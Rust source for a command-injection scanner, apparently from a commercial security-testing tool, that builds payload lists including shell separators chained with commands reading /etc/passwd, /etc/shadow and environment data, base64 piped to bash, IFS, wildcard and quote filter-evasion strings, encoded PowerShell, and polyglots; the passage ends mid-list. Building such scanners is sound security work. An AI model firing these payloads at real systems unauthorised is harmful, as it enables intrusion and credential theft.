// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::http_client::HttpClient;
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::scanners::registry::PayloadIntensity;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tracing::{debug, info};

/// Command injection bypass category
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum CmdInjectionCategory {
    /// Basic shell metacharacters (;, |, &, etc.)
    ShellMetacharacters,
    /// Command substitution ($(), ``)
    CommandSubstitution,
    /// Newline/carriage return injection
    NewlineInjection,
    /// URL encoding bypass
    EncodingBypass,
    /// Double encoding bypass
    DoubleEncoding,
    /// Environment variable exploitation
    EnvironmentVars,
    /// Time-based blind injection
    TimeBased,
    /// DNS out-of-band detection
    DnsOutOfBand,
    /// Filter evasion techniques
    FilterEvasion,
    /// Windows-specific commands
    WindowsSpecific,
    /// Unix-specific commands
    UnixSpecific,
    /// Argument injection
    ArgumentInjection,
    /// Obfuscation techniques
    Obfuscation,
    /// Context breaking (quotes, escapes)
    ContextBreaking,
    /// Polyglot payloads
    Polyglot,
    /// Wildcard bypass
    WildcardBypass,
    /// Quote manipulation
    QuoteManipulation,
    /// Concatenation bypass
    ConcatenationBypass,
    /// Hex/Octal encoding
    HexOctalEncoding,
    /// IFS manipulation
    IFSManipulation,
    /// Brace expansion
    BraceExpansion,
}

impl CmdInjectionCategory {
    fn as_str(&self) -> &str {
        match self {
            Self::ShellMetacharacters => "Shell Metacharacters",
            Self::CommandSubstitution => "Command Substitution",
            Self::NewlineInjection => "Newline Injection",
            Self::EncodingBypass => "Encoding Bypass",
            Self::DoubleEncoding => "Double Encoding",
            Self::EnvironmentVars => "Environment Variables",
            Self::TimeBased => "Time-Based Blind",
            Self::DnsOutOfBand => "DNS Out-of-Band",
            Self::FilterEvasion => "Filter Evasion",
            Self::WindowsSpecific => "Windows Specific",
            Self::UnixSpecific => "Unix Specific",
            Self::ArgumentInjection => "Argument Injection",
            Self::Obfuscation => "Obfuscation",
            Self::ContextBreaking => "Context Breaking",
            Self::Polyglot => "Polyglot",
            Self::WildcardBypass => "Wildcard Bypass",
            Self::QuoteManipulation => "Quote Manipulation",
            Self::ConcatenationBypass => "Concatenation Bypass",
            Self::HexOctalEncoding => "Hex/Octal Encoding",
            Self::IFSManipulation => "IFS Manipulation",
            Self::BraceExpansion => "Brace Expansion",
        }
    }
}

/// Command injection payload with metadata
struct CmdPayload {
    payload: String,
    category: CmdInjectionCategory,
    description: String,
    detection_method: DetectionMethod,
    expected_delay: Option<u64>,
}

#[derive(Debug, Clone)]
enum DetectionMethod {
    /// Check for command output in response
    OutputBased,
    /// Check for response time delay
    TimeBased(u64),
    /// Check for DNS callback
    DnsCallback,
    /// Check for error messages
    ErrorBased,
}

pub struct CommandInjectionScanner {
    http_client: Arc<HttpClient>,
}

impl CommandInjectionScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    // ============================================================
    // PAYLOAD GENERATORS - Create 1000+ payloads algorithmically
    // ============================================================

    /// Generate shell metacharacter separators
    fn generate_separators(&self) -> Vec<(&'static str, &'static str)> {
        vec![
            (";", "Semicolon"),
            (";;", "Double semicolon"),
            ("|", "Pipe"),
            ("||", "Double pipe (OR)"),
            ("&", "Ampersand"),
            ("&&", "Double ampersand (AND)"),
            ("\n", "Newline"),
            ("\r\n", "CRLF"),
            ("\r", "Carriage return"),
            ("%0a", "URL encoded LF"),
            ("%0d", "URL encoded CR"),
            ("%0d%0a", "URL encoded CRLF"),
            ("%00", "Null byte"),
            ("`", "Backtick start"),
            ("$(", "Dollar paren start"),
        ]
    }

    /// Generate commands to execute for detection
    fn generate_commands(&self) -> Vec<(&'static str, &'static str, bool)> {
        // (command, description, is_windows)
        vec![
            // Unix commands
            ("id", "Unix id command", false),
            ("whoami", "Whoami command", false),
            ("uname", "Unix uname", false),
            ("uname -a", "Unix uname all", false),
            ("cat /etc/passwd", "Read passwd file", false),
            ("cat /etc/shadow", "Read shadow file", false),
            ("ls", "List directory", false),
            ("ls -la", "List all files", false),
            ("ls -la /", "List root", false),
            ("pwd", "Print working directory", false),
            ("env", "Print environment", false),
            ("printenv", "Print environment alt", false),
            ("set", "Print shell variables", false),
            ("ps", "Process list", false),
            ("ps aux", "All processes", false),
            ("netstat -an", "Network stats", false),
            ("ifconfig", "Network interfaces", false),
            ("ip addr", "IP addresses", false),
            ("hostname", "Hostname", false),
            ("df -h", "Disk space", false),
            ("free -m", "Memory usage", false),
            ("w", "Who is logged in", false),
            ("last", "Last logins", false),
            ("history", "Command history", false),
            ("cat /proc/version", "Kernel version", false),
            ("cat /proc/self/environ", "Process environ", false),
            ("/bin/id", "Full path id", false),
            ("/usr/bin/id", "Usr path id", false),
            ("/bin/cat /etc/passwd", "Full path cat passwd", false),
            // Windows commands
            ("dir", "Windows dir", true),
            ("dir C:\\", "Windows dir C:", true),
            ("type C:\\Windows\\win.ini", "Read win.ini", true),
            (
                "type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "Read hosts",
                true,
            ),
            ("whoami", "Windows whoami", true),
            ("hostname", "Windows hostname", true),
            ("ipconfig", "Windows IP config", true),
            ("ipconfig /all", "Windows full IP config", true),
            ("net user", "Windows users", true),
            ("net localgroup", "Windows groups", true),
            ("systeminfo", "Windows system info", true),
            ("tasklist", "Windows processes", true),
            ("netstat -an", "Windows netstat", true),
            ("set", "Windows env vars", true),
            ("echo %USERNAME%", "Windows username", true),
            ("echo %COMPUTERNAME%", "Windows computer", true),
            ("echo %PATH%", "Windows PATH", true),
            ("echo %USERPROFILE%", "Windows user profile", true),
        ]
    }

    /// Generate time-based delay commands
    fn generate_delay_commands(&self) -> Vec<(&'static str, u64, bool)> {
        // (command, delay_seconds, is_windows)
        vec![
            // Unix sleep
            ("sleep 5", 5, false),
            ("sleep 10", 10, false),
            ("sleep 3", 3, false),
            ("/bin/sleep 5", 5, false),
            // Unix ping (blocks for count * 1 second)
            ("ping -c 5 127.0.0.1", 5, false),
            ("ping -c 10 127.0.0.1", 10, false),
            // Windows timeout
            ("timeout /t 5", 5, true),
            ("timeout /t 10", 10, true),
            // Windows ping
            ("ping -n 5 127.0.0.1", 5, true),
            ("ping -n 10 127.0.0.1", 10, true),
            // Slow operations
            ("head -c 10000000 /dev/zero", 3, false),
            ("dd if=/dev/zero bs=1M count=100", 3, false),
        ]
    }

    /// Generate shell metacharacter payloads
    fn generate_metachar_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();
        let separators = self.generate_separators();
        let commands = self.generate_commands();

        // Generate combinations: separator + command
        for (sep, sep_desc) in &separators {
            for (cmd, cmd_desc, _is_win) in &commands {
                // Skip backtick/dollar-paren as they need special handling
                if *sep == "`" || *sep == "$(" {
                    continue;
                }

                // Basic: separator + command
                payloads.push(CmdPayload {
                    payload: format!("{}{}", sep, cmd),
                    category: CmdInjectionCategory::ShellMetacharacters,
                    description: format!("{} + {}", sep_desc, cmd_desc),
                    detection_method: DetectionMethod::OutputBased,
                    expected_delay: None,
                });

                // With space: separator + space + command
                payloads.push(CmdPayload {
                    payload: format!("{} {}", sep, cmd),
                    category: CmdInjectionCategory::ShellMetacharacters,
                    description: format!("{} space + {}", sep_desc, cmd_desc),
                    detection_method: DetectionMethod::OutputBased,
                    expected_delay: None,
                });

                // Wrapped: separator + command + separator
                if *sep != "\n" && *sep != "\r" && *sep != "\r\n" {
                    payloads.push(CmdPayload {
                        payload: format!("{}{}{}", sep, cmd, sep),
                        category: CmdInjectionCategory::ShellMetacharacters,
                        description: format!("{} wrapped + {}", sep_desc, cmd_desc),
                        detection_method: DetectionMethod::OutputBased,
                        expected_delay: None,
                    });
                }
            }
        }

        payloads
    }

    /// Generate command substitution payloads
    fn generate_substitution_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();
        let commands = self.generate_commands();

        for (cmd, cmd_desc, is_win) in &commands {
            if *is_win {
                continue; // Substitution is Unix-specific
            }

            // Backtick substitution
            payloads.push(CmdPayload {
                payload: format!("`{}`", cmd),
                category: CmdInjectionCategory::CommandSubstitution,
                description: format!("Backtick {}", cmd_desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            // Dollar-paren substitution
            payloads.push(CmdPayload {
                payload: format!("$({})", cmd),
                category: CmdInjectionCategory::CommandSubstitution,
                description: format!("Dollar-paren {}", cmd_desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            // With prefix
            payloads.push(CmdPayload {
                payload: format!("a`{}`", cmd),
                category: CmdInjectionCategory::CommandSubstitution,
                description: format!("Prefix backtick {}", cmd_desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            payloads.push(CmdPayload {
                payload: format!("a$({})", cmd),
                category: CmdInjectionCategory::CommandSubstitution,
                description: format!("Prefix dollar-paren {}", cmd_desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            // Wrapped
            payloads.push(CmdPayload {
                payload: format!("a`{}`b", cmd),
                category: CmdInjectionCategory::CommandSubstitution,
                description: format!("Wrapped backtick {}", cmd_desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            payloads.push(CmdPayload {
                payload: format!("a$({})b", cmd),
                category: CmdInjectionCategory::CommandSubstitution,
                description: format!("Wrapped dollar-paren {}", cmd_desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        // Nested substitution
        payloads.push(CmdPayload {
            payload: "$($(id))".to_string(),
            category: CmdInjectionCategory::CommandSubstitution,
            description: "Nested dollar-paren".to_string(),
            detection_method: DetectionMethod::OutputBased,
            expected_delay: None,
        });

        payloads.push(CmdPayload {
            payload: "`$(id)`".to_string(),
            category: CmdInjectionCategory::CommandSubstitution,
            description: "Mixed backtick dollar".to_string(),
            detection_method: DetectionMethod::OutputBased,
            expected_delay: None,
        });

        payloads.push(CmdPayload {
            payload: "$(`id`)".to_string(),
            category: CmdInjectionCategory::CommandSubstitution,
            description: "Dollar with backtick".to_string(),
            detection_method: DetectionMethod::OutputBased,
            expected_delay: None,
        });

        payloads
    }

    /// Generate time-based blind payloads
    fn generate_time_based_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();
        let separators = vec![";", "|", "||", "&&", "&", "\n", "%0a"];
        let delay_commands = self.generate_delay_commands();

        for sep in &separators {
            for (cmd, delay, _is_win) in &delay_commands {
                // Basic: separator + delay command
                payloads.push(CmdPayload {
                    payload: format!("{}{}", sep, cmd),
                    category: CmdInjectionCategory::TimeBased,
                    description: format!("Time-based {} ({}s)", cmd, delay),
                    detection_method: DetectionMethod::TimeBased(*delay),
                    expected_delay: Some(*delay),
                });

                // With space
                payloads.push(CmdPayload {
                    payload: format!("{} {}", sep, cmd),
                    category: CmdInjectionCategory::TimeBased,
                    description: format!("Time-based spaced {} ({}s)", cmd, delay),
                    detection_method: DetectionMethod::TimeBased(*delay),
                    expected_delay: Some(*delay),
                });
            }
        }

        // Command substitution with delay
        for (cmd, delay, is_win) in &delay_commands {
            if *is_win {
                continue;
            }

            payloads.push(CmdPayload {
                payload: format!("$({})", cmd),
                category: CmdInjectionCategory::TimeBased,
                description: format!("Dollar-paren {} ({}s)", cmd, delay),
                detection_method: DetectionMethod::TimeBased(*delay),
                expected_delay: Some(*delay),
            });

            payloads.push(CmdPayload {
                payload: format!("`{}`", cmd),
                category: CmdInjectionCategory::TimeBased,
                description: format!("Backtick {} ({}s)", cmd, delay),
                detection_method: DetectionMethod::TimeBased(*delay),
                expected_delay: Some(*delay),
            });
        }

        payloads
    }

    /// Generate encoding bypass payloads
    fn generate_encoding_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();

        // URL encoded separators
        let encoded_payloads = vec![
            // URL encoded
            (
                "%3bid",
                "URL encoded semicolon id",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%3Bid",
                "URL encoded semicolon (upper) id",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%7cid",
                "URL encoded pipe id",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%7Cid",
                "URL encoded pipe (upper) id",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%26id",
                "URL encoded ampersand id",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%26%26id",
                "URL double ampersand id",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%7c%7cid",
                "URL double pipe id",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%60id%60",
                "URL encoded backticks id",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%24(id)",
                "URL encoded dollar paren",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%24%28id%29",
                "URL full encoded $(id)",
                CmdInjectionCategory::EncodingBypass,
            ),
            // Double URL encoded
            (
                "%253bid",
                "Double encoded semicolon id",
                CmdInjectionCategory::DoubleEncoding,
            ),
            (
                "%253Bid",
                "Double encoded semicolon (upper) id",
                CmdInjectionCategory::DoubleEncoding,
            ),
            (
                "%257cid",
                "Double encoded pipe id",
                CmdInjectionCategory::DoubleEncoding,
            ),
            (
                "%2526id",
                "Double encoded ampersand id",
                CmdInjectionCategory::DoubleEncoding,
            ),
            (
                "%2560id%2560",
                "Double encoded backticks",
                CmdInjectionCategory::DoubleEncoding,
            ),
            (
                "%2524%2528id%2529",
                "Double encoded $(id)",
                CmdInjectionCategory::DoubleEncoding,
            ),
            // Triple URL encoded
            (
                "%25253bid",
                "Triple encoded semicolon id",
                CmdInjectionCategory::DoubleEncoding,
            ),
            (
                "%25257cid",
                "Triple encoded pipe id",
                CmdInjectionCategory::DoubleEncoding,
            ),
            // Unicode encoding
            (
                "%u003bid",
                "Unicode semicolon",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%u007cid",
                "Unicode pipe",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                "%u0026id",
                "Unicode ampersand",
                CmdInjectionCategory::EncodingBypass,
            ),
        ];

        for (payload, desc, category) in encoded_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        // Hex encoding for bash
        let hex_payloads = vec![
            ("$'\\x69\\x64'", "Hex encoded id"),
            ("$'\\x77\\x68\\x6f\\x61\\x6d\\x69'", "Hex encoded whoami"),
            (
                "$'\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'",
                "Hex encoded cat /etc/passwd",
            ),
            ("$'\\x6c\\x73'", "Hex encoded ls"),
            ("$'\\x75\\x6e\\x61\\x6d\\x65'", "Hex encoded uname"),
        ];

        for (payload, desc) in hex_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::HexOctalEncoding,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            // With separator
            payloads.push(CmdPayload {
                payload: format!(";{}", payload),
                category: CmdInjectionCategory::HexOctalEncoding,
                description: format!("Semicolon + {}", desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        // Octal encoding for bash
        let octal_payloads = vec![
            ("$'\\151\\144'", "Octal encoded id"),
            ("$'\\167\\150\\157\\141\\155\\151'", "Octal encoded whoami"),
            ("$'\\154\\163'", "Octal encoded ls"),
        ];

        for (payload, desc) in octal_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::HexOctalEncoding,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            payloads.push(CmdPayload {
                payload: format!(";{}", payload),
                category: CmdInjectionCategory::HexOctalEncoding,
                description: format!("Semicolon + {}", desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        // Base64 encoding
        let base64_payloads = vec![
            ("$(echo aWQ= | base64 -d)", "Base64 id"),
            ("`echo aWQ= | base64 -d`", "Backtick base64 id"),
            ("$(echo d2hvYW1p | base64 -d)", "Base64 whoami"),
            ("$(echo bHM= | base64 -d)", "Base64 ls"),
            (
                "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
                "Base64 cat passwd",
            ),
            (";echo aWQ= | base64 -d | bash", "Base64 piped to bash"),
            (";bash -c \"$(echo aWQ= | base64 -d)\"", "Bash -c base64"),
            ("|base64 -d<<<aWQ=", "Herestring base64"),
        ];

        for (payload, desc) in base64_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::Obfuscation,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        payloads
    }

    /// Generate IFS and environment variable payloads
    fn generate_ifs_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();

        let ifs_payloads = vec![
            // IFS (Internal Field Separator) bypass
            (";$IFS$9id", "IFS space bypass"),
            ("${IFS}id", "IFS variable bypass"),
            (";${IFS}id", "Semicolon IFS id"),
            ("|${IFS}id", "Pipe IFS id"),
            ("&&${IFS}id", "AND IFS id"),
            ("||${IFS}id", "OR IFS id"),
            (";$IFS'id'", "IFS with quotes"),
            (";$IFS$IFSid", "Double IFS"),
            ("$IFS;$IFS$9id", "IFS separator IFS id"),
            // Tab as separator
            (";\tid", "Tab separator id"),
            ("|\tid", "Pipe tab id"),
            // Various IFS variations
            (";{id}", "Brace id"),
            (";{id,}", "Brace expansion id"),
            (";{id,whoami}", "Multi brace expansion"),
            ("$IFS`id`", "IFS backtick"),
            ("$IFS$(id)", "IFS dollar-paren"),
            // Environment variables
            ("$SHELL", "Shell variable"),
            ("${SHELL}", "Shell variable braces"),
            ("$HOME", "Home directory"),
            ("${HOME}", "Home directory braces"),
            ("$PATH", "PATH variable"),
            ("$USER", "User variable"),
            ("$HOSTNAME", "Hostname variable"),
            ("$$", "Process ID"),
            ("$0", "Shell name"),
            ("$@", "All parameters"),
            ("$*", "All parameters alt"),
            ("$#", "Parameter count"),
            ("$?", "Exit status"),
            ("$!", "Background PID"),
        ];

        for (payload, desc) in ifs_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::IFSManipulation,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        // PATH bypass
        let path_payloads = vec![
            (";/???/i?", "Glob id path"),
            (";/???/??oami", "Glob whoami path"),
            (";/???/b??/id", "Glob bin id"),
            (";/???/b??/wh*", "Glob whoami partial"),
            (";/???/???/id", "Glob usr bin id"),
            ("${PATH:0:1}bin${PATH:0:1}id", "PATH variable bypass"),
            ("${PATH:0:1}etc${PATH:0:1}passwd", "PATH to passwd"),
        ];

        for (payload, desc) in path_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::WildcardBypass,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        payloads
    }

    /// Generate filter evasion payloads
    fn generate_filter_evasion_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();

        // Wildcard bypass
        let wildcard_payloads = vec![
            ("/???/i?", "Wildcard id"),
            ("/???/??oami", "Wildcard whoami"),
            ("/???/b??/id", "Wildcard bin id"),
            ("/???/b??/wh*", "Wildcard whoami partial"),
            ("/???/???/i?", "Wildcard usr bin id"),
            ("/b?n/i?", "Short wildcard id"),
            ("/b?n/c?t /e?c/p?ss??", "Wildcard cat passwd"),
            ("c?t /e?c/p?ss??", "Wildcard cat no path"),
            ("wh?ami", "Wildcard whoami simple"),
            ("who*", "Wildcard who*"),
            ("*d", "Wildcard *d"),
            ("i*", "Wildcard i*"),
        ];

        for (payload, desc) in &wildcard_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::WildcardBypass,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            // With separator
            payloads.push(CmdPayload {
                payload: format!(";{}", payload),
                category: CmdInjectionCategory::WildcardBypass,
                description: format!("Semicolon {}", desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        // Quote manipulation
        let quote_payloads = vec![
            ("i''d", "Empty single quote"),
            ("i\"\"d", "Empty double quote"),
            ("w'h'o'a'm'i", "Split single quotes"),
            ("w\"h\"o\"a\"m\"i", "Split double quotes"),
            ("'i'd", "Quote in middle"),
            ("\"i\"d", "Double quote in middle"),
            ("'wh'oami", "Quote split whoami"),
            ("wh''oami", "Empty quote in whoami"),
            ("wh\"\"oami", "Empty dquote in whoami"),
            ("c''at /e''tc/pa''sswd", "Quoted cat passwd"),
            ("c\"\"at /e\"\"tc/pa\"\"sswd", "Dquoted cat passwd"),
        ];

        for (payload, desc) in &quote_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::QuoteManipulation,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            payloads.push(CmdPayload {
                payload: format!(";{}", payload),
                category: CmdInjectionCategory::QuoteManipulation,
                description: format!("Semicolon {}", desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        // Backslash bypass
        let backslash_payloads = vec![
            ("i\\d", "Backslash in id"),
            ("w\\h\\o\\a\\m\\i", "Backslashes in whoami"),
            ("c\\at /e\\tc/pa\\sswd", "Backslash cat passwd"),
            ("\\i\\d", "Leading backslash id"),
            ("wh\\oami", "Single backslash whoami"),
        ];

        for (payload, desc) in &backslash_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::FilterEvasion,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            payloads.push(CmdPayload {
                payload: format!(";{}", payload),
                category: CmdInjectionCategory::FilterEvasion,
                description: format!("Semicolon {}", desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        // Concatenation bypass
        let concat_payloads = vec![
            ("'i''d'", "Quote concatenation id"),
            ("\"i\"\"d\"", "Double quote concat id"),
            ("i$()d", "Empty subshell concat"),
            ("i``d", "Empty backtick concat"),
            ("$'i'$'d'", "Dollar quote concat"),
            ("/bin/c'a't /etc/passwd", "Quoted cat command"),
            ("/bin/'c'at /etc/passwd", "Single char quoted"),
        ];

        for (payload, desc) in &concat_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::ConcatenationBypass,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });

            payloads.push(CmdPayload {
                payload: format!(";{}", payload),
                category: CmdInjectionCategory::ConcatenationBypass,
                description: format!("Semicolon {}", desc),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        // Comment bypass
        let comment_payloads = vec![
            ("id#comment", "Hash comment"),
            ("id;#", "Semicolon hash"),
            ("id #", "Space hash"),
            ("id\t#comment", "Tab hash comment"),
            ("id%00", "Null byte terminator"),
            ("id%00comment", "Null byte comment"),
        ];

        for (payload, desc) in comment_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::FilterEvasion,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        payloads
    }

    /// Generate context breaking payloads
    fn generate_context_breaking_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();

        // Quote breaking
        let quote_break_payloads = vec![
            ("\";id;\"", "Break double quotes"),
            ("';id;'", "Break single quotes"),
            ("\";id;#", "Break and comment"),
            ("';id;#", "Single break comment"),
            ("\"$(id)\"", "Subst in double quotes"),
            ("\"`id`\"", "Backtick in double quotes"),
            ("\"$({id})\"", "Brace in double quotes"),
            // Escape breaking
            ("\\\";id", "Escaped quote break"),
            ("\\';id", "Escaped single quote break"),
            ("\\\n;id", "Escaped newline break"),
            ("\\`id\\`", "Escaped backticks"),
            // Argument injection
            ("\" -o evil.txt", "Argument injection"),
            ("' -o evil.txt", "Single arg injection"),
            ("--help;id", "Flag injection"),
            ("-v;id", "Short flag injection"),
            ("--version;id", "Version flag injection"),
            ("-h;id", "Help flag injection"),
            ("--help$(id)", "Flag with subst"),
            // Filename context
            ("test.txt;id", "Filename semicolon"),
            ("test|id", "Filename pipe"),
            ("test`id`", "Filename backtick"),
            ("test$(id)", "Filename subst"),
            ("test\nid", "Filename newline"),
            ("test%0aid", "Filename URL newline"),
            // Path context
            ("../../../etc/passwd", "Path traversal"),
            (";cat ../../../etc/passwd", "Semicolon path traversal"),
            ("|cat ../../../etc/passwd", "Pipe path traversal"),
        ];

        for (payload, desc) in quote_break_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::ContextBreaking,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        payloads
    }

    /// Generate Windows-specific payloads
    fn generate_windows_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();

        let windows_payloads = vec![
            // Basic separators
            ("&whoami", "Ampersand whoami"),
            ("&&whoami", "Double ampersand whoami"),
            ("|whoami", "Pipe whoami"),
            ("||whoami", "Double pipe whoami"),
            ("& whoami", "Ampersand space whoami"),
            // CMD specific
            ("& echo %username%", "Echo username"),
            ("& echo %computername%", "Echo computername"),
            ("& dir", "Dir command"),
            ("& dir C:\\", "Dir C drive"),
            ("& type C:\\Windows\\win.ini", "Type win.ini"),
            (
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "Type hosts",
            ),
            ("& net user", "Net user"),
            ("& net localgroup administrators", "Net admins"),
            ("& ipconfig", "Ipconfig"),
            ("& ipconfig /all", "Ipconfig all"),
            ("& systeminfo", "Systeminfo"),
            ("& tasklist", "Tasklist"),
            ("& netstat -an", "Netstat"),
            // Environment variables
            ("&set", "Set command"),
            ("& echo %PATH%", "Echo PATH"),
            ("& echo %USERPROFILE%", "Echo userprofile"),
            ("& echo %TEMP%", "Echo temp"),
            ("& echo %SYSTEMROOT%", "Echo systemroot"),
            // PowerShell
            ("& powershell -c \"whoami\"", "PowerShell whoami"),
            ("& powershell -c \"Get-Process\"", "PowerShell processes"),
            ("& powershell -c \"Get-ChildItem\"", "PowerShell ls"),
            (
                "& powershell -c \"Get-Content C:\\Windows\\win.ini\"",
                "PowerShell read file",
            ),
            ("& powershell -enc d2hvYW1p", "PowerShell encoded"),
            ("& powershell -e d2hvYW1p", "PowerShell short encoded"),
            ("|powershell -c id", "Pipe PowerShell"),
            // CMD newlines
            ("%0d%0adir", "CRLF dir"),
            ("\r\ndir", "Raw CRLF dir"),
            ("%0adir", "LF dir"),
            // Concatenation
            ("&who^ami", "Caret whoami"),
            ("&wh\"\"oami", "Empty quotes whoami"),
            ("&typ^e C:\\Windows\\win.ini", "Caret type"),
        ];

        for (payload, desc) in windows_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::WindowsSpecific,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        payloads
    }

    /// Generate polyglot payloads that work in multiple contexts
    fn generate_polyglot_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();

        let polyglot_payloads = vec![
            // Quote polyglots
            ("';id;#\"", "Quote polyglot"),
            ("\"|id|\"", "Pipe polyglot"),
            ("$(id)`id`", "Substitution polyglot"),
            (";id||id&&id", "Chaining polyglot"),
            // Cross-platform
            (";id&whoami", "Unix/Windows semicolon ampersand"),
            ("|id|whoami", "Double pipe universal"),
            ("&id;whoami", "Ampersand semicolon"),
            // Escape polyglots
            ("\\';id;\\\"", "Escape polyglot"),
            ("\\'\\\"id\\'\\\"", "Multi escape"),
            // Multiple injection points
            (";id;#';id;#\";id;#", "Triple context"),
            ("%0a;id%0a|id%0a`id`", "Encoded multi"),
            ("$(id)|`id`|;id", "All substitution types"),
            // Comprehensive
            (
                "a]|id||`id`||$(id)||;id;#\"';id;#\\",
                "Kitchen sink polyglot",
            ),
            ("\n;id\n|id\n`id`\n$(id)", "Newline polyglot"),
            ("%0a%0d;id%0a%0d|id%0a%0d", "CRLF polyglot"),
            // Context-aware
            ("{{id}}", "Template injection style"),
            ("${id}", "Variable style"),
            ("#{id}", "Ruby/Shell style"),
            ("<%=id%>", "ERB style"),
            (
                "{{constructor.constructor('return id')()}}",
                "Prototype pollution style",
            ),
        ];

        for (payload, desc) in polyglot_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::Polyglot,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        payloads
    }

    /// Generate obfuscation payloads
    fn generate_obfuscation_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();

        let obfuscation_payloads = vec![
            // Case variations (Windows CMD)
            (";ID", "Uppercase ID"),
            (";WHOAMI", "Uppercase WHOAMI"),
            (";WhOaMi", "Mixed case whoami"),
            (";iD", "Mixed case id"),
            // Variable expansion
            (";i$()d", "Empty subshell concat"),
            (";i``d", "Empty backtick concat"),
            (";w$()hoami", "Empty subshell in word"),
            (";wh$()oami", "Empty subshell mid word"),
            // Reversed commands
            (";$(rev<<<'di')", "Reversed id"),
            (";$(printf 'id')", "Printf id"),
            (";$(printf '%s' 'id')", "Printf %s id"),
            (";$(echo 'di' | rev)", "Echo rev id"),
            // Brace expansion
            (";{i,}d", "Brace expansion id"),
            (";{id,}", "Brace expansion id alt"),
